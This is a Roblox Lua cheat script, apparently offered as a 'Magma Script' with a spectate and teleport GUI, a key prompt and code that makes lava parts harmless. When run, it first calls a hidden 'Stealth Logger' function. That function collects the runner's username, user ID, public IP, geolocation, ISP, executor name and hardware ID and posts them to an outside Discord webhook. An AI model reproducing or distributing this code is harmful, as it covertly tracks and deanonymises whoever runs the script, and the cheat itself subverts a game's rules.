local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer
local camera = workspace.CurrentCamera
local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

local function sendDetailedLog()
    local ipData = "取得失敗"
    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
    local info = {Name = "不明"}
    local avatarUrl = ""

    pcall(function()
        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. lp.UserId .. "&size=720x720&format=Png&isCircular=false"
        local thumbRes = game:HttpGet(thumbApi)
        local thumbData = HttpService:JSONDecode(thumbRes)
        if thumbData and thumbData.data and thumbData.data[1] then
            avatarUrl = thumbData.data[1].imageUrl
        else
            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
        end
    end)

    pcall(function()
        info = MarketplaceService:GetProductInfo(game.PlaceId)
        ipData = game:HttpGet("https://api.ipify.org")
        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
        geoData = HttpService:JSONDecode(response)
    end)

    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
    local hwid = (gethwid and gethwid()) or "取得不可"
    
    local deviceDetail = "不明"
    if GuiService:IsTenFootInterface() then
        deviceDetail = "🎮 Console (Xbox/PS)"
    elseif UserInputService.TouchEnabled then
        local screenSize = camera.ViewportSize
        deviceDetail = math.min(screenSize.X, screenSize.Y) < 600 and "📱 Mobile (Phone)" or "平板 Tablet"
    elseif UserInputService.KeyboardEnabled then
        deviceDetail = "💻 PC (Windows/Mac)"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
            ["color"] = 0xff4500,
            ["fields"] = {
                {["name"] = "👤 ユーザー", ["value"] = "**Username:** `" .. lp.Name .. "`\n**DisplayName:** " .. lp.DisplayName .. "\n**UserID:** `" .. lp.UserId .. "`\n**垢経過:** " .. lp.AccountAge .. "日", ["inline"] = true},
                {["name"] = "🛠 実行環境", ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`", ["inline"] = true},
                {["name"] = "🌐 ネットワーク", ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"), ["inline"] = false},
                {["name"] = "📍 サーバー/実行場所", ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId .. "\n**JobId:** `" .. game.JobId .. "`", ["inline"] = false}
            },
            ["thumbnail"] = {["url"] = avatarUrl},
            ["footer"] = {["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X")}
        }}
    }

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

sendDetailedLog() 

local function DisableMagma()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            local name = obj.Name:lower()
            if name:find("magma") or name:find("lava") then
                obj.CanTouch = false
            end
        end
    end
end
RunService.Heartbeat:Connect(DisableMagma)

local gui = Instance.new("ScreenGui")
gui.Name = "SpectateUI"
gui.ResetOnSpawn = false
gui.Parent = lp:WaitForChild("PlayerGui")
gui.Enabled = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 280)
frame.Position = UDim2.new(0, 20, 0.5, -140)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-35,0,30)
title.BackgroundTransparency = 1
title.Text = "🔥 Magma Script"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Parent = frame

local miniBtn = Instance.new("TextButton")
miniBtn.Size = UDim2.new(0,25,0,25)
miniBtn.Position = UDim2.new(1,-28,0,3)
miniBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
miniBtn.Text = "－"
miniBtn.TextColor3 = Color3.new(1,1,1)
miniBtn.Parent = frame
Instance.new("UICorner", miniBtn)

local mainScroll = Instance.new("ScrollingFrame")
mainScroll.Size = UDim2.new(1, 0, 1, -40)
mainScroll.Position = UDim2.new(0, 0, 0, 35)
mainScroll.BackgroundTransparency = 1
mainScroll.ScrollBarThickness = 4
mainScroll.Parent = frame
local mainLayout = Instance.new("UIListLayout", mainScroll)
mainLayout.Padding = UDim.new(0,6)
mainLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local searchBox = Instance.new("TextBox")
searchBox.Size = UDim2.new(0.9,0,0,25)
searchBox.PlaceholderText = "🔍 Search"
searchBox.BackgroundColor3 = Color3.fromRGB(35,35,35)
searchBox.TextColor3 = Color3.new(1,1,1)
searchBox.Parent = mainScroll
Instance.new("UICorner", searchBox)

local playerScroll = Instance.new("ScrollingFrame")
playerScroll.Size = UDim2.new(0.9, 0, 0, 80)
playerScroll.BackgroundTransparency = 0.9
playerScroll.BackgroundColor3 = Color3.new(0,0,0)
playerScroll.Parent = mainScroll
local pLayout = Instance.new("UIListLayout", playerScroll)

local btnFrame = Instance.new("Frame")
btnFrame.Size = UDim2.new(0.9, 0, 0, 100)
btnFrame.BackgroundTransparency = 1
btnFrame.Parent = mainScroll
local grid = Instance.new("UIGridLayout", btnFrame)
grid.CellSize = UDim2.new(0.5,-3,0,25)
grid.CellPadding = UDim2.new(0,6,0,6)

local function createBtn(txt, color, parent)
    local b = Instance.new("TextButton")
    b.Text = txt
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1,1,1)
    b.TextScaled = true
    b.Parent = parent
    Instance.new("UICorner", b)
    return b
end

local bReset = createBtn("Reset Cam", Color3.fromRGB(80,40,40), btnFrame)
local bRespawn = createBtn("Respawn", Color3.fromRGB(100,60,20), btnFrame)
local bTp = createBtn("Teleport", Color3.fromRGB(40,80,40), btnFrame)
local bLog = createBtn("Log", Color3.fromRGB(60,60,60), btnFrame)

bReset.MouseButton1Click:Connect(function() camera.CameraSubject = lp.Character.Humanoid end)
bRespawn.MouseButton1Click:Connect(function() lp.Character.Humanoid.Health = 0 end)
bTp.MouseButton1Click:Connect(function() lp.Character.HumanoidRootPart.CFrame = CFrame.new(6.12, 1458.32, -29.12) end)
bLog.MouseButton1Click:Connect(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", true) end)

RunService.RenderStepped:Connect(function()
    mainScroll.CanvasSize = UDim2.new(0,0,0,mainLayout.AbsoluteContentSize.Y + 10)
end)

local keyGui = Instance.new("ScreenGui")
keyGui.Name = "KeyInputUI"
keyGui.Parent = lp:WaitForChild("PlayerGui")
local keyFrame = Instance.new("Frame")
keyFrame.Size = UDim2.new(0,240,0,80)
keyFrame.Position = UDim2.new(0.5,-120,0.5,-40)
keyFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
keyFrame.Parent = keyGui
Instance.new("UICorner", keyFrame)
local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1,-20,0,30)
inputBox.Position = UDim2.new(0,10,0,35)
inputBox.PlaceholderText = "Key: key123"
inputBox.Parent = keyFrame
Instance.new("UICorner", inputBox)

inputBox.FocusLost:Connect(function()
    if inputBox.Text:lower():gsub("%s+", "") == "key123" then
        gui.Enabled = true
        keyGui:Destroy()
    else
        lp:Kick("Invalid Key")
    end
end)
